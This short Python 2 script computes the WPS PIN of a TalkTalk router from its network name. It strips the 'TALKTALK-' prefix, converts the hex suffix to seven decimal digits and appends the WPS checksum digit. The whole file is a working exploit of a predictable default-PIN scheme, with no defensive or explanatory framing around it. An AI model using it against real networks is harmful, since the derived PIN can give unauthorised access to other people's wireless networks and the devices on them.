# Function to calculate the WPS checksum of a 7 digit number
def wps_checksum(pin):
  accum = 0
  while pin>0:
    accum += 3 * (pin % 10);
    pin /= 10;
    accum += pin % 10;
    pin /= 10;
  return (10 - accum % 10) % 10

# Enter the wifi essid string here
essid_string = "TALKTALK-33A3C0"
print "Essid: "+essid_string 

# Remove the useless part of essid if it's present
if ("TALKTALK-" in essid_string):
  essid_string = essid_string.replace("TALKTALK-","")

# Convert hex string to decimal and ensure it's only 7 digits
essid_dec = int(essid_string, 16) % 10000000

# Calculate the checksum digit and print pin
print "WPS Pin: %07d%d" % (essid_dec,wps_checksum(essid_dec))